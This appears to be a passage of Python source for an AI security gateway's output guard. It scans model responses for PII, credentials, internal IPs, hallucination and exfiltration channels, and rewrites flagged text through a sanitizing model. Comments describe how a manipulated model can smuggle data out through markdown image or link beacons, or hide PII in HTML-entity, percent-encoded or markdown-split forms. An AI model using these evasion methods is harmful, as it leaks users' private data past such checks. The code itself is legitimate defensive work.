        3. IP leakage -> block or flag
        4. Hallucination scoring -> flag
        5. Semantic leakage -> flag (if detector attached)

        The worst (highest-priority) action wins.

        Args:
            org_config: Per-tenant config (used to look up
                ``hallucination_grounding_mode`` and
                ``hallucination_grounding_threshold`` from migration 0022).
                Falls back to the gateway-level ``self._config`` if omitted.
            org_slug: Tenant identifier passed to the semantic grounding
                backend for embedder cache isolation and telemetry.
        """
        text = normalize_output_scan_text(text)
        if not text:
            return OutputVerdict()

        verdicts: list[OutputVerdict] = []

        # Per-detector control reads from the per-tenant org_config first, then
        # falls back to the gateway-level config. Each detector has an independent
        # enable toggle and a configurable action (block/redact/rewrite/flag/allow).
        cfg = org_config or self._config

        def _enabled(key: str, default: bool = True) -> bool:
            return bool(cfg.get(key, default))

        def _action(key: str, default: str) -> str:
            value = str(cfg.get(key, default) or default).lower()
            return value if value in _VALID_OUTPUT_ACTIONS else default

        def _operator_action_for_category(threat_type: str) -> str:
            """FULL OPERATOR CONTROL (2026-07-16): map a tier-2 guard-model finding
            to the OPERATOR's configured per-detector action. The guard model only
            DETECTS; the operator decides the ACTION. Returns 'allow' (drop the
            finding) when the operator disabled that detector or set it to allow, so
            the guard model can never impose an action the operator did not choose.
            """
            t = str(threat_type or "").lower()
            if any(k in t for k in ("pii", "phi", "pci", "ssn", "email", "phone", "address", "personal")):
                return _action("output_pii_action", "redact") if _enabled("output_pii_enabled", True) else "allow"
            # Credential/secret aliases — concrete secret shapes the guard model labels
            # under generic OWASP names (LLM06 sensitive-info / connection strings /
            # keys) must map to the credential detector, not fall to the policy
            # catch-all which would override an operator credential="allow".
            if any(k in t for k in (
                "secret", "credential", "api_key", "apikey", "password", "token",
                "connection_string", "private_key", "access_key", "secret_key",
                "bearer", "certificate", "cert", "sensitive_info", "sensitive_information",
                "information_disclosure", "data_leak", "dataleak", "llm06",
            )):
                return _action("output_credential_action", "redact") if _enabled("output_credential_enabled", True) else "allow"
            if any(k in t for k in ("ip_leak", "ip_leakage", "infrastructure", "internal_url")):
                return _action("output_ip_leakage_action", "redact") if _enabled("output_ip_leakage_enabled", True) else "allow"
            if "hallucinat" in t:
                return _action("output_hallucination_action", "flag")
            # policy_violation / compliance / jailbreak / injection / toxic / guard_model / unknown
            return _action("output_policy_action", "block") if _enabled("output_policy_enabled", True) else "allow"

        if _enabled("output_pii_enabled", True):
            pii_action = _action("output_pii_action", "redact")
            if pii_action != "allow":
                pii_verdict = await self._check_pii_secrets(text, pii_action)
                if pii_verdict.action != "allow":
                    verdicts.append(pii_verdict)

        if _enabled("output_credential_enabled", True):
            # 1.7 policy "redact the response": output secrets/credentials are
            # surgically REDACTED + delivered (200), not whole-response blocked.
            # (output_credential_action may still override per-org.)
            cred_action = _action("output_credential_action", "redact")
            if cred_action != "allow":
                cred_verdict = self._check_credential_exposure(text, cred_action)
                if cred_verdict.action != "allow":
                    verdicts.append(cred_verdict)

        if _enabled("output_ip_leakage_enabled", True):
            ip_action = _action(
                "output_ip_leakage_action",
                "block" if self._config.get("output_block_on_ip_leakage", False) else "redact",
            )
            # FULL OPERATOR CONTROL (2026-07-16): the configured output_ip_leakage_action
            # is honoured EXACTLY (block/redact/rewrite/flag/allow) — no coercion to
            # redact. ip_leakage is FP-prone, so the DEFAULT (when the org has no
            # explicit opinion) is still "redact" (see the _action() default above),
            # but an operator who deliberately selects flag/rewrite/block gets that
            # action. This mirrors the honesty contract the §1.7 UI advertises.
            if ip_action != "allow":
                ip_verdict = self._check_ip_leakage(text, ip_action)
                if ip_verdict.action != "allow":
                    verdicts.append(ip_verdict)

        # UI enable is `factuality_check_enabled` (control); sync maps it to
        # `hallucination_flag_enabled`. OR the two so a stale/partial bundle
        # cannot leave §1.7 Hallucination OFF while the UI toggle is ON.
        if "hallucination_flag_enabled" in cfg or "factuality_check_enabled" in cfg:
            _hall_enabled = bool(cfg.get("hallucination_flag_enabled")) or bool(
                cfg.get("factuality_check_enabled")
            )
        else:
            _hall_enabled = bool(self._config.get("hallucination_flag_enabled", True))
        if _hall_enabled:
            hall_action = _action("output_hallucination_action", "flag")
            if hall_action != "allow":
                hall_verdict = await self._check_hallucination_markers(
                    text,
                    context_chunks,
                    action=hall_action,
                    org_config=org_config,
                    org_slug=org_slug,
                )
                if hall_verdict.action != "allow":
                    verdicts.append(hall_verdict)

        if self._leakage_detector is not None:
            leakage_verdict = self._check_semantic_leakage(text)
            if leakage_verdict.action != "allow":
                verdicts.append(leakage_verdict)

        # G13: neutralize output-side data-exfiltration channels (markdown image /
        # link / bare URL smuggling data to an external host). Redactable + delivered
        # 200 (defang the beacon, keep the answer); never whole-response blocked.
        if _enabled("output_exfil_enabled", True):
            exfil_action = _action("output_exfil_action", "redact")
            if exfil_action != "allow":
                exfil_verdict = self._check_exfil_channel(text, exfil_action)
                if exfil_verdict.action != "allow":
                    verdicts.append(exfil_verdict)

        # ── Tier-2: ZeroShield guard model (ML) on the OUTPUT ───────────────
        # Mirrors INPUT scanning: the static detectors above are tier-1; the
        # ZeroShield guard model then scans the model output (same guard model +
        # breaker/cache as input). Gated by output_tier2_enabled (default on)
        # AND the org tri-state tier2_enabled. FAIL-OPEN: a guard-model outage
        # must never block an already-generated response — scan_output_with_tier2
        # degrades to the static verdict and any error here is swallowed.
        output_scan_degraded = False
        # R2: track whether the tier-2 guard model actually ran and rated the
        # OUTPUT clean (allow). When it did, its verdict is authoritative over the
        # false-positive-prone deterministic ip_leakage heuristic — a benign
        # example IP that the smart guard model cleared must not be destroyed by
        # the static detector. (Only ip_leakage is gated this way; PII/secret/
        # credential static detectors stay fail-safe and are NOT suppressed.)
        guard_rated_clean = False
        if _enabled("output_tier2_enabled", True) and self._scanner is not None:
            try:
                t2 = await self._scanner.scan_output_with_tier2(
                    text,
                    org_tier2_override=cfg.get("tier2_enabled"),
                    org_slug=org_slug,
                )
                # M11: a degraded tier-2 OUTPUT scan (breaker open / parse fail)
                # comes back as a 'scanner_degraded' verdict — the output was NOT
                # confidently scanned. Mark degraded so it's visible downstream.
                if t2 is not None and str(getattr(t2, "threat_type", "")) == "scanner_degraded":
                    output_scan_degraded = True
                # R2: a completed, non-degraded scan that returned a non-blocking
                # verdict = the guard model rated this output clean.
                if (
                    t2 is not None
                    and not output_scan_degraded
                    and t2.action not in ("block", "redact", "flag")
                ):
                    guard_rated_clean = True
                # FULL OPERATOR CONTROL (2026-07-16): the guard model DETECTS
                # (t2.action != allow); the OPERATOR's configured per-detector action
                # for the detected category decides what happens. This replaces the
                # guard model's own block/redact/flag recommendation, so setting a
                # detector to "flag"/"allow" is honoured even when the guard would
                # have blocked. A category the operator set to "allow" (or disabled)
                # maps to "allow" here and the finding is dropped.
                _t2_op_action = (
                    _operator_action_for_category(t2.threat_type)
                    if t2 is not None
                    else "allow"
                )
                if (
                    t2 is not None
                    and t2.action in ("block", "redact", "flag")
                    and _t2_op_action != "allow"
                ):
                    t2_patterns = list(getattr(t2, "matched_patterns", []) or [])
                    # Defense-in-depth (M-01): the guard-model ScanVerdict can carry
                    # raw evidence/findings (matched fragments of the model output) in
                    # its matched_patterns and detail strings. Those flow straight into
                    # the client-facing OutputVerdict, so scrub any PII/secret/credential
                    # value out of them here as a belt-and-suspenders to the scanner.py
                    # source fix. redact_all is a no-op on plain pattern-key strings.
                    t2_compliance_tags = get_compliance_tags(t2_patterns)
                    # G10: keep the RAW guard-model evidence spans so the sanitizer can
                    # mask semantically-detected PII/secret that redact_all has no regex
                    # for (free-text names, non-standard layouts, passphrases). Only for
                    # redactable categories, and only value-like spans (see
                    # _redaction_spans_from). These stay INTERNAL (never serialized to
                    # the client/telemetry); the display copy below is still masked.
                    t2_redaction_spans = (
                        _redaction_spans_from(t2_patterns, t2.threat_type or "")
                        if _t2_op_action in ("block", "redact")
                        else []
                    )
                    # G16: mask RAW evidence VALUES (free-text names/passphrases that
                    # redact_all is a no-op on) in the client-facing display copy while
                    # keeping category labels ("ssn"/"email") readable — matched_patterns
                    # flows to the client enforcement envelope, so a raw value here would
                    # leak the just-redacted content back through metadata.
                    t2_patterns = [_mask_evidence_span(str(p), t2.threat_type or "") for p in t2_patterns]
                    t2_detail = redact_all(
                        t2.detail or "ZeroShield guard model (tier-2) flagged output"
                    )
                    verdicts.append(OutputVerdict(
                        action=_t2_op_action,
                        threat_type=t2.threat_type or "guard_model",
                        confidence=float(getattr(t2, "confidence", 0.0) or 0.0),
                        detail=t2_detail,
                        matched_patterns=t2_patterns,
                        compliance_tags=t2_compliance_tags,
                        redaction_spans=t2_redaction_spans,
                    ))
            except Exception:  # noqa: BLE001 - output tier-2 must never break delivery
                # M11: fail-open (never block an already-generated response on a
                # guard outage) but make it VISIBLE — WARN (was silent debug) +
                # mark the verdict degraded so telemetry + client metadata record
                # that the output was passed UNSCANNED.
                output_scan_degraded = True
                LOG.warning(
                    "Output tier-2 guard-model scan FAILED — output passed UNSCANNED (fail-open / degraded)",
                    exc_info=True,
                )

        # R2: the guard model cleared this output, so drop the false-positive-prone
        # deterministic ip_leakage verdict (e.g. a textbook 192.168.0.1). The
        # guard model is the authoritative arbiter for the infra-leakage heuristic;
        # other categories (PII/secret/credential/hallucination) are unaffected.
        #
        # N-IP FIX: but do NOT suppress when the org EXPLICITLY opted into hard
        # deterministic IP blocking via output_block_on_ip_leakage. That flag is a
        # deliberate "I care about internal IPs even if they look benign" signal —
        # letting a tier-2 "clean" rating silently drop the verdict would override
        # the org's explicit policy. Default orgs (no opt-in) still get the FP
        # reduction; opt-in orgs get deterministic blocking tier-2 cannot undo.
        # FULL OPERATOR CONTROL (2026-07-16): the guard-rated-clean FP-reduction for
        # the noisy static ip_leakage heuristic is only applied when the operator has
        # NOT expressed an explicit protective ip-leakage action. If the operator set
        # output_ip_leakage_action to anything other than "allow" (or opted into the
        # legacy hard-block flag), their choice wins and the guard cannot silently
        # drop the ip_leakage verdict. Operators who want the FP reduction set
        # output_ip_leakage_action="allow" (disables the detector entirely).
        _ip_op_action = _action("output_ip_leakage_action", "redact")
        _ip_hard_block = (
            bool(self._config.get("output_block_on_ip_leakage", False))
            or _ip_op_action != "allow"
        )
        if guard_rated_clean and verdicts and not _ip_hard_block:
            verdicts = [v for v in verdicts if str(getattr(v, "threat_type", "")) != "ip_leakage"]

        if not verdicts:
            return OutputVerdict(scan_degraded=output_scan_degraded)

        selected = self._select_highest_severity(verdicts)
        selected.scan_degraded = selected.scan_degraded or output_scan_degraded
        # FULL OPERATOR CONTROL (2026-07-16): the configured action is honoured
        # EXACTLY. Previously a redactable category (pii/pci/phi/secret/credential)
        # escalated to "block" was silently downgraded to "redact" (the §1.7
        # "surgically redact, never whole-block" floor). That made the "block"
        # selection indistinguishable from "redact" in the UI + pipeline trace.
        # Operators now own the choice: selecting "block" whole-response-blocks
        # (403) even for redactable categories; "redact" masks in place. The
        # per-detector _action() default remains a sensible value (redact for PII),
        # so orgs with no explicit opinion are unchanged.
        return selected

    async def _check_pii_secrets(self, text: str, action: str = "redact") -> OutputVerdict:
        """Delegate PII/secret detection to the existing scanner."""
        verdict = await self._scanner.scan_output(text)
        if verdict.threat_type in ("pii", "secret") and verdict.matched_patterns:
            pattern_keys = verdict.matched_patterns
            matched_values = dict(getattr(verdict, "matched_values", None) or {})
            # FULL OPERATOR CONTROL (2026-07-16): the configured action is honoured
            # EXACTLY, including for already smart-masked shapes (j***@a***.com,
            # ***-**-6789). Previously smart-mask-only output was force-flagged
            # regardless of the operator's selection, so the dropdown looked inert
            # on already-masked data. Operators who want already-masked PII delivered
            # untouched select "flag" or "allow"; those who select "redact"/"rewrite"
            # get that action applied (a smart-masked value is re-masked / rewritten).
            effective_action = action
            value_detail = ""
            if matched_values:
                # detail is client-facing: embed MASKED values only.
                # matched_values keeps the raw values for operator telemetry.
                value_detail = " — " + ", ".join(
                    f"{k}={_mask_value_for_detail(v)}"
                    for k, v in matched_values.items()
                )
            return OutputVerdict(
                action=effective_action,
                threat_type=verdict.threat_type,
                confidence=verdict.confidence,
                detail=f"PII/secret detected in output: {', '.join(pattern_keys)}{value_detail}",
                matched_patterns=pattern_keys,
                matched_values=matched_values,
                compliance_tags=get_compliance_tags(pattern_keys),
            )
        return OutputVerdict()

    def _check_credential_exposure(self, text: str, action: str = "block") -> OutputVerdict:
        """Check for exposed credentials (bearer tokens, connection strings, etc.)."""
        found = detect_credential_exposure(text)
        if not found:
            return OutputVerdict()

        pattern_keys = list(found.keys())
        return OutputVerdict(
            action=action,
            threat_type="credential",
            confidence=0.95,
            detail=f"Credential exposure detected: {', '.join(pattern_keys)}",
            matched_patterns=pattern_keys,
            compliance_tags=get_compliance_tags(pattern_keys),
        )

    def _check_ip_leakage(self, text: str, action: str = "flag") -> OutputVerdict:
        """Check for internal IP addresses, hostnames, and file paths."""
        found = detect_ip_leakage(text)
        if not found:
            return OutputVerdict()

        pattern_keys = list(found.keys())
        return OutputVerdict(
            action=action,
            threat_type="ip_leakage",
            confidence=0.8,
            detail=f"Infrastructure leakage detected: {', '.join(pattern_keys)}",
            matched_patterns=pattern_keys,
            compliance_tags=get_compliance_tags(pattern_keys),
        )

    async def _check_hallucination_markers(
        self,
        text: str,
        context_chunks: list[str] | None = None,
        *,
        action: str = "flag",
        org_config: dict | None = None,
        org_slug: str = "",
    ) -> OutputVerdict:
        """Enhanced hallucination check with numeric scoring."""
        score = await self.score_hallucination(
            text,
            context_chunks,
            org_config=org_config,
            org_slug=org_slug,
        )

        cfg = org_config or self._config
        has_context = bool(context_chunks)
        if has_context:
            threshold = float(
                cfg.get("hallucination_grounding_threshold", _RAG_GROUNDED_HALLUCINATION_THRESHOLD)
            )
        else:
            threshold = float(
                cfg.get(
                    "hallucination_no_context_threshold",
                    cfg.get("hallucination_grounding_threshold", _NO_CONTEXT_HALLUCINATION_THRESHOLD),
                )
            )

        if score.risk_score < threshold:
            return OutputVerdict()

        return OutputVerdict(
            action=action,
            threat_type="hallucination",
            confidence=score.risk_score,
            detail=score.detail,
            matched_patterns=score.matched_markers,
            compliance_tags=[],
        )

    def _check_semantic_leakage(self, text: str) -> OutputVerdict:
        """Check output for semantic similarity to confidential content."""
        verdict = self._leakage_detector.check_leakage(text)
        if verdict.action != "allow":
            return OutputVerdict(
                action="flag",
                threat_type="semantic_leakage",
                confidence=verdict.leakage_score,
                detail=verdict.detail,
                matched_patterns=verdict.matched_fingerprints,
                compliance_tags=["DLP"],
            )
        return OutputVerdict()

    def _check_exfil_channel(self, text: str, action: str = "redact") -> OutputVerdict:
        """G13: detect data-exfiltration channels in the model output.

        The client-facing ``detail`` names only the channel kind and destination
        host (safe) — never the smuggled payload, which is masked by
        :func:`neutralize_exfil_channels` on the sanitized egress.
        """
        findings = list(_scan_exfil_channels(text))
        # G49: the URL scan hit its per-output budget — a benign single answer never has
        # this many distinct URLs, a beacon could hide past the cap, and running the
        # (uncapped) egress neutralizer on an output this large would be a soft-DoS. Fail
        # CLOSED: block the output as a probable data-exfiltration / URL-flood pattern.
        if any(k == _EXFIL_BUDGET_SENTINEL for k, _u, _r in findings):
            return OutputVerdict(
                action="block",
                threat_type="exfil_channel",
                confidence=0.6,
                detail=(
                    f"Output contains an unusually large number of URLs (> {_MAX_EXFIL_URLS}); "
                    "blocked as a probable data-exfiltration / URL-flood pattern."
                ),
                matched_patterns=["exfil_url_flood"],
            )
        if not findings:
            return OutputVerdict()
        kinds = sorted({k for k, _u, _r in findings})
        hosts: list[str] = []
        for _k, url, _r in findings:
            hm = re.match(r"https?://([^/?#]*)", url, re.IGNORECASE)
            if hm and hm.group(1):
                hosts.append(hm.group(1))
        zero_click = any(k == "image" for k, _u, _r in findings)
        host_list = ", ".join(sorted(set(hosts))[:3]) or "external host"
        return OutputVerdict(
            action=action,
            threat_type="exfil_channel",
            confidence=0.9 if zero_click else 0.8,
            detail=(
                f"Data-exfiltration channel in output "
                f"({'/'.join(kinds)} -> {host_list}): smuggled payload neutralized"
                + (" (zero-click auto-render defanged)" if zero_click else "")
            ),
            matched_patterns=[f"exfil_{k}" for k in kinds],
            compliance_tags=["DLP"],
        )

    async def score_hallucination(
        self,
        output_text: str,
        context_chunks: list[str] | None = None,
        *,
        org_config: dict | None = None,
        org_slug: str = "",
    ) -> HallucinationScore:
        """
        Compute a numeric hallucination risk score.

        Components:
        1. Pattern score: count of hallucination marker matches, normalized
        2. Grounding score: if context_chunks provided, measure overlap.
           Algorithm is selected by the per-tenant
           ``hallucination_grounding_mode`` field (migration 0022):
           ``"lexical"`` (default), ``"semantic"``, or ``"hybrid"``. The
           semantic backend (Bedrock Titan v2) is used only when a
           :class:`GroundingGuard` has been attached via
           :meth:`set_grounding_guard`; otherwise we fall back to lexical.
        3. Contradiction score: detect self-contradictions within the output
        """
        if not output_text:
            return HallucinationScore()

        if is_safety_refusal_output(output_text):
            return HallucinationScore(
                risk_score=0.0,
                pattern_score=0.0,
                grounding_score=1.0,
                contradiction_score=0.0,
                matched_markers=[],
                detail="hallucination_risk=0.000 (safety_refusal_excluded)",
            )

        found = detect_hallucination_markers(output_text)
        # Epistemic-hedging markers ("I'm not sure", "I think", "I cannot verify")
        # signal CALIBRATED uncertainty, not fabrication. Counting them with the
        # same positive sign as fabrication-shape markers inverts the score —
        # penalizing cautious-correct answers while flat confident lies (no
        # markers) score 0. Exclude hedges from the risk weight; still report
        # them in matched_markers for telemetry transparency.
        _HEDGE_MARKERS = {"uncertainty_hedge", "confidence_disclaimer"}
        pattern_count = sum(1 for _k in found if _k not in _HEDGE_MARKERS)
        pattern_score = min(pattern_count * 0.15, 1.0)

        cfg = org_config or self._config
        mode = str(cfg.get("hallucination_grounding_mode", "lexical") or "lexical").lower()

        grounding_score = 1.0
        if context_chunks:
            grounding_score = await self._compute_grounding_score_with_mode(
                output_text,
                context_chunks,
                mode=mode,
                org_slug=org_slug,
            )

        contradiction_score = (
            self._detect_contradictions(output_text) if context_chunks else 0.0
        )

        if context_chunks:
            risk = (
                pattern_score * 0.25
                + (1.0 - grounding_score) * 0.50
                + contradiction_score * 0.25
            )
        else:
            risk = pattern_score * 0.80

        return HallucinationScore(
            risk_score=round(min(risk, 1.0), 3),
            pattern_score=round(pattern_score, 3),
            grounding_score=round(grounding_score, 3),
            contradiction_score=round(contradiction_score, 3),
            matched_markers=list(found.keys()),
            detail=(
                f"hallucination_risk={risk:.3f} "
                f"(pattern={pattern_score:.2f}, "
                f"grounding={grounding_score:.2f} [{mode}], "
                f"contradiction={contradiction_score:.2f})"
            ),
        )

    async def _compute_grounding_score_with_mode(
        self,
        output_text: str,
        context_chunks: list[str],
        *,
        mode: str,
        org_slug: str,
    ) -> float:
        """Algorithm dispatcher for ``hallucination_grounding_mode``.

        Returns a float in ``[0.0, 1.0]`` where higher == better-grounded
        (matches the legacy lexical-Jaccard contract used by
        ``score_hallucination``).

        Fail-open behavior: any semantic-path failure (no guard attached,
        circuit OPEN, embedder error) silently falls back to the lexical
        result so the gateway never blocks on grounding-pipeline outages.
        """
        lexical = self._compute_grounding_score(output_text, context_chunks)

        # Fast paths
        if mode == "lexical" or self._grounding_guard is None:
            return lexical
        if mode not in {"semantic", "hybrid"}:
            return lexical

        try:
            semantic = await self._grounding_guard.score(
                answer_text=output_text,
                context_chunks=list(context_chunks),
                org_slug=org_slug,
                assume_redacted=True,  # caller MUST have already redacted
            )
        except Exception:  # noqa: BLE001 — fail-OPEN to lexical
            LOG.exception(
                "OutputGuard: semantic grounding failed; falling back to lexical"
            )
            return lexical

        if semantic is None:
            return lexical

        if mode == "semantic":
            return float(semantic)
        # hybrid
        return float((lexical + semantic) / 2.0)

    @staticmethod
    def _compute_grounding_score(output: str, context_chunks: list[str]) -> float:
        """Compute lexical grounding score using token-level overlap."""
        output_tokens = set(output.lower().split())
        if not output_tokens:
            return 1.0

        context_tokens: set[str] = set()
        for chunk in context_chunks:
            context_tokens.update(chunk.lower().split())

        if not context_tokens:
            return 0.5

        output_meaningful = output_tokens - _STOPWORDS
        if not output_meaningful:
            return 1.0

        overlap = output_meaningful & context_tokens
        return len(overlap) / len(output_meaningful)

    @staticmethod
    def _detect_contradictions(text: str) -> float:
        """Detect self-contradictions within text. Returns 0.0-1.0."""
        sentences = re.split(r"[.!?]+", text)
        sentences = [s.strip().lower() for s in sentences if len(s.strip()) > 10]

        if len(sentences) < 2:
            return 0.0

        contradiction_signals = 0
        for sentence in sentences:
            for pattern in _CONTRADICTION_PATTERNS:
                if pattern.search(sentence):
                    contradiction_signals += 1
                    break

        return min(contradiction_signals * 0.2, 1.0)

    @staticmethod
    def _select_highest_severity(verdicts: list[OutputVerdict]) -> OutputVerdict:
        """Select the verdict with the highest-priority action."""
        return max(verdicts, key=lambda v: ACTION_PRIORITY.get(v.action, 0))


def _static_rewrite_text(threat_type: str, detail: str | None = None) -> str:
    """Deterministic canned replacement text — the safe fallback when a genuine
    content-preserving rewrite is unavailable (no client / inference failed)."""
    safe_templates = {
        "hallucination": (
            "I cannot verify that claim from the available evidence. "
            "Please confirm it with authoritative sources or request grounded citations."
        ),
        "pii": "Sensitive personal information was removed from the generated response.",
        "secret": "Sensitive credentials or secrets were removed from the generated response.",
        "credential": "Sensitive credentials or secrets were removed from the generated response.",
        "ip_leakage": "Sensitive infrastructure details were removed from the generated response.",
        "policy_violation": "The original model output was rewritten to comply with response safety policy.",
    }
    base_message = safe_templates.get(threat_type or "", safe_templates["policy_violation"])
    if detail and threat_type == "hallucination":
        return f"{base_message} Review detail: {detail}"
    return base_message


# Per-threat instruction injected into the sanitization system prompt so the
# rewrite removes only the offending content while preserving the rest of the
# answer's meaning.
_REWRITE_THREAT_GUIDANCE = {
    "pii": (
        "Remove or redact every piece of personal data (names, emails, phone "
        "numbers, SSNs, addresses, account numbers). Replace each with a neutral "
        "placeholder like [redacted]. Keep all other information intact."
    ),
    "secret": (
        "Remove every credential, password, API key, token, or secret value. "
        "Replace each with [redacted]. Preserve the surrounding explanation."
    ),
    "credential": (
        "Remove every credential, password, API key, token, or secret value. "
        "Replace each with [redacted]. Preserve the surrounding explanation."
    ),
    "ip_leakage": (
        "Remove internal IP addresses, private hostnames, and sensitive "
        "infrastructure file paths. Generalize them (e.g. 'an internal server'). "
        "Keep the rest of the answer intact."
    ),
    "hallucination": (
        "Remove unverifiable or fabricated claims and citations. Keep only "
        "statements supported by the surrounding context, and add a brief note "
        "that unverified details were omitted."
    ),
    "policy_violation": (
        "Rewrite the response so it complies with safety policy while preserving "
        "as much of the original useful meaning as possible."
    ),
}

_REWRITE_SYSTEM_PROMPT = (
    "You are an output-sanitization assistant for an AI security gateway. You are "
    "given a model response that violated a safety policy. Rewrite it so the "
    "specific sensitive or unsafe content is removed or neutralized, while "
    "PRESERVING the meaning, tone, and usefulness of everything else. "
    "CRITICAL: replace each sensitive value with a short NATURAL-LANGUAGE "
    "placeholder in square brackets that describes what was removed (e.g. "
    "'[email removed]', '[phone number removed]', '[SSN removed]', "
    "'[card number removed]', '[internal address removed]'). Do NOT invent "
    "replacement names, email addresses, phone numbers, card numbers, SSNs, IP "
    "addresses or other identifiers — the rewritten text must contain NO real or "
    "fake sensitive identifiers of any kind. Do not add commentary, apologies, or "
    "meta explanations beyond what is requested. Output ONLY the rewritten "
    "response text."
)

_MAX_REWRITE_INPUT_CHARS = 8000


def _content_preserving_rewrite(
    threat_type: str,
    original_text: str,
    *,
    bedrock_client,
    model_id: str | None = None,
    context_chunks: list[str] | None = None,
) -> str | None:
    """Re-infer a sanitized version of ``original_text`` via the guard model.

    Returns the rewritten text on success, or ``None`` if inference is
    unavailable / failed (callers fall back to the static template). The result
    is always passed through ``redact_all`` as a final deterministic safety net
    so a residual PII/secret value can never slip through the rewrite.
    """
    if not original_text or bedrock_client is None:
        return None

    guidance = _REWRITE_THREAT_GUIDANCE.get(
        threat_type or "", _REWRITE_THREAT_GUIDANCE["policy_violation"]
    )
    snippet = original_text[:_MAX_REWRITE_INPUT_CHARS]
    user_parts = [f"Violation type: {threat_type or 'policy_violation'}", f"Instruction: {guidance}"]
    if context_chunks:
        joined = " ".join(str(c) for c in context_chunks)[:2000]
        if joined.strip():
            user_parts.append(f"Grounding context (use only this for factual claims):\n{joined}")
    user_parts.append(f"Original response to rewrite:\n{snippet}")
    user_text = "\n\n".join(user_parts)

    try:
        result = bedrock_client.converse(
            model=model_id or "",
            system_text=_REWRITE_SYSTEM_PROMPT,
            user_text=user_text,
            max_tokens=1024,
            temperature=0.0,
            call_site="output_rewrite",
        )
    except Exception:  # noqa: BLE001 — rewrite must never raise into the response path
        LOG.exception("OutputGuard: content-preserving rewrite inference failed")
        return None

    rewritten = _extract_converse_text(result)
    if not rewritten or not rewritten.strip():
        return None
    # FULL-CONTROL HONESTY (2026-07-16): deliver the GENUINE rewrite; apply redact_all
    # only as a RESIDUAL safety net when the rewrite model left a real PII/secret token
    # behind (so a compliant rewrite is not blanket-masked into "[redacted]" and thus
    # made indistinguishable from the redact action).
    _clean = rewritten.strip()
    _residual = redact_all(_clean)
    return _residual if _residual != _clean else _clean


def _extract_converse_text(result) -> str:
    """Pull the assistant text out of a BedrockClient.converse() result dict."""
    try:
        choices = (result or {}).get("raw", {}).get("choices") or []
        if not choices:
            return ""
        message = choices[0].get("message") or {}
        content = message.get("content")
        if isinstance(content, str):
            return content
        if isinstance(content, list):
            # OpenAI-style content blocks.
            parts = [
                blk.get("text", "")
                for blk in content
                if isinstance(blk, dict)
            ]
            return "".join(parts)
        return str(content or "")
    except Exception:  # noqa: BLE001
        return ""


def rewrite_output_response_text(
    threat_type: str,
    detail: str | None = None,
    *,
    original_text: str | None = None,
    bedrock_client=None,
    model_id: str | None = None,
    context_chunks: list[str] | None = None,
) -> str:
    """Produce the replacement text for an output-guard rewrite action.

    Backward-compatible: called with only ``(threat_type, detail)`` it returns
    the deterministic canned text (unchanged legacy behavior). When
    ``original_text`` and a ``bedrock_client`` are supplied, it performs a
    genuine content-preserving LLM re-inference that redacts/neutralizes the
    offending content while preserving the rest of the response, falling back to
    the canned text if inference is unavailable or fails.
    """
    if original_text and bedrock_client is not None:
        rewritten = _content_preserving_rewrite(
            threat_type,
            original_text,
            bedrock_client=bedrock_client,
            model_id=model_id,
            context_chunks=context_chunks,
        )
        if rewritten:
            return rewritten
    return _static_rewrite_text(threat_type, detail)


async def rewrite_output_response_text_async(
    threat_type: str,
    detail: str | None = None,
    *,
    original_text: str | None = None,
    bedrock_client=None,
    model_id: str | None = None,
    context_chunks: list[str] | None = None,
) -> str:
    """Async wrapper around :func:`rewrite_output_response_text`.

    Offloads the blocking boto3 ``converse`` call to a thread so it can be
    awaited from the async gateway request path without blocking the event
    loop. Intended call site: ``main.py`` output-guard rewrite handling.
    """
    if not (original_text and bedrock_client is not None):
        return _static_rewrite_text(threat_type, detail)

    import asyncio
    import functools

    loop = asyncio.get_event_loop()
    func = functools.partial(
        rewrite_output_response_text,
        threat_type,
        detail,
        original_text=original_text,
        bedrock_client=bedrock_client,
        model_id=model_id,
        context_chunks=context_chunks,
    )
    return await loop.run_in_executor(None, func)


# G35: runs of HTML character-references or percent-encodings long enough to carry
# a PII/secret value. A manipulated model can emit PII as &#..; / %.. so the raw
# value never appears in the egress bytes, yet a browser/markdown renderer auto-
# decodes it back to the PII. Mask the whole encoded run (not the value inside it),
# so no position-mapping is needed. Benign entity/percent runs (colour hex, emoji,
# ©/™, url path segments) do NOT decode to a PII/secret pattern and are preserved.
_ENCODED_PII_RUN_RE = re.compile(
    r"(?:&#x?[0-9a-fA-F]{1,6};){6,}|(?:%[0-9a-fA-F]{2}){6,}"
)


def _decode_encoded_run(run: str) -> str:
    def _cp(n: int) -> str:
        return chr(n) if 0 <= n < 0x110000 else ""
    s = re.sub(r"&#x([0-9a-fA-F]{1,6});", lambda m: _cp(int(m.group(1), 16)) or m.group(0), run)
    s = re.sub(r"&#(\d{1,7});", lambda m: _cp(int(m.group(1))) or m.group(0), s)
    s = re.sub(r"%([0-9a-fA-F]{2})", lambda m: _cp(int(m.group(1), 16)) or m.group(0), s)
    return s


def neutralize_encoded_pii(text: str) -> str:
    """Mask HTML-entity / percent-encoded runs in model output that DECODE to a
    PII/secret value (output-side laundering; symmetric to input G33). Strict no-op
    on benign encoded runs. Bounded single-pass regex (ReDoS-safe)."""
    if not text or ("&#" not in text and "%" not in text):
        return text

    def _sub(m: "re.Match[str]") -> str:
        decoded = _decode_encoded_run(m.group(0))
        if detect_pii(decoded) or detect_secrets(decoded):
            return "[ENCODED_PII_REDACTED]"
        return m.group(0)

    try:
        return _ENCODED_PII_RUN_RE.sub(_sub, text)
    except Exception:  # noqa: BLE001 - sanitizer must never break the egress
        return text


# G44: a token whose chars are interleaved with inline markdown emphasis/code markers,
# where stripping them reveals a PII/secret (``1**2**3-45-6789`` -> SSN, ``john`@`x.com``
# -> email). Disjoint char classes (word/PII vs emphasis) -> linear (ReDoS-safe).
# G50/G51: intra-word render-invisible separators a renderer drops — markdown emphasis
# (``*`` / `` ` ``; ``_`` stays literal per CommonMark) PLUS HTML comments / empty tags.
# A value run interspersed with these visually reassembles, so match the whole run, strip
# the separators, and re-detect. Each subpattern is bounded (``.*?`` closed by ``-->``,
# ``[^>]*`` negated) and the two char classes are disjoint -> LINEAR (no ReDoS).
# The comment body is CAPPED ({0,400}) — a real render-away obfuscation comment is tiny, and
# an unbounded ``.*?`` re-scanned per value position is a ReDoS. Empty/self-closing tag bodies
# are likewise negated-class bounded.
_RENDER_INVIS_SEP = (
    r"(?:[*`]"
    r"|<!--.{0,400}?-->"
    r"|<[a-zA-Z][a-zA-Z0-9]*\b[^>]{0,400}>\s*</[a-zA-Z]+\s*>"
    r"|<[a-zA-Z][a-zA-Z0-9]*\b[^>]{0,400}/\s*>)"
)
